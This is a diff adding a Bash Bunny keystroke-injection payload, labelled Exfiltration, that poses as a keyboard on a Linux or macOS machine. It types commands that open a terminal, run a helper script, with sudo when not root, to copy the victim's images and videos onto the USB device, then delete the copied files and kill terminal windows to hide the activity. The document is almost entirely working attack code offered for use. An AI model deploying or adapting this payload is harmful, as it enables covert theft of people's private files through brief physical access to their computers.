@@ -1,0 +1,87 @@
+# Title:         Hash Slinging Stasher for Bash Bunny
+# Description:   Copies files to Bash Bunny udisk from the target OS matching given extensions and file size only if their checksum does not appear in a user defined or generated checksum list, and appends the checksum of copied files to that list.
+# Author:        theSW4n
+# Version:       1.0
+# Category:      Exfiltration
+# Target:        Tested on Ubuntu 22.04.3 LTS, MacOS 13.x, and Kali Linux 2023.3 (not compatible with Windows)
+# Attackmodes:   HID, Storage
+
+# Options
+hss_target_directory=/
+hss_target_extensions=jpg jpeg gif bmp raw webp psd orf rw2 flv webm ogg h264 hevc heic heif dng cr2 tiff crw nef pef mov qt mp4 m4p m4v mpg mpe mpv m2v svi 3gp 3g2 mpeg avi wmv mts m2ts ts png
+hss_find_file_size=+10k
+
+######## SETUP PHASE ########
+LED SETUP
+GET SWITCH_POSITION
+mount /dev/nandf /root/udisk
+rm -rf /root/HSS
+cp -r /root/udisk/payloads/${SWITCH_POSITION} /root/HSS
+sync
+umount /dev/nandf
+udisk mount
+mv -f /root/HSS /root/udisk/HSS
+sync
+udisk umount
+ATTACKMODE HID STORAGE
+
+######## ATTACK PHASE ########
+LED ATTACK
+QUACK GUI SPACE
+QUACK GUI
+QUACK STRING "terminal"
+QUACK ENTER
+QUACK DELAY 1500
+QUACK STRING "xterm"
+QUACK ENTER
+QUACK DELAY 1500
+QUACK STRING "n"
+QUACK ENTER
+QUACK DELAY 1500
+QUACK STRING "udisksctl mount -b /dev/disk/by-label/`ls /dev/disk/by-label/ | grep -i BashBunny`"
+QUACK ENTER
+QUACK DELAY 1500
+QUACK STRING "cp -rf \$(mount | grep -i BashBunny | cut -d ' ' -f 3)/HSS /tmp"
+QUACK ENTER
+QUACK DELAY 1500
+QUACK STRING "chmod -R 755 /tmp/HSS"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "cd /tmp/HSS"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "/bin/bash"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "if [ \""\$EUID\"" -ne 0 ]; then \$(find ~+ -name"
+QUACK STRING " \""hss_bbscript.sh\""); else \$(sudo \$(find ~+ -name"
+QUACK STRING " \""hss_bbscript.sh\"")); fi"
+QUACK ENTER
+QUACK DELAY 1000
+sync
+
+
+QUACK STRING "exit"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "cd /"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "rm -rf /tmp/HSS"
+QUACK ENTER
+QUACK DELAY 1500
+QUACK STRING "rm -rf \$(mount | grep -i BashBunny | cut -d ' ' -f 3)/HSS"
+QUACK ENTER
+QUACK DELAY 1500
+QUACK STRING "udisksctl unmount -b /dev/disk/by-label/`ls /dev/disk/by-label/ | grep -i BashBunny`"
+QUACK ENTER
+QUACK DELAY 1500
+QUACK STRING "diskutil eject \$(mount | grep -i BashBunny | cut -d ' ' -f 3)"
+QUACK ENTER
+QUACK DELAY 2000
+QUACK STRING "killall qterminal & killall Terminal & killall gnome-terminal- &  killall konsole & killall xterm"
+QUACK ENTER
+sync
+
+LED FINISH
+
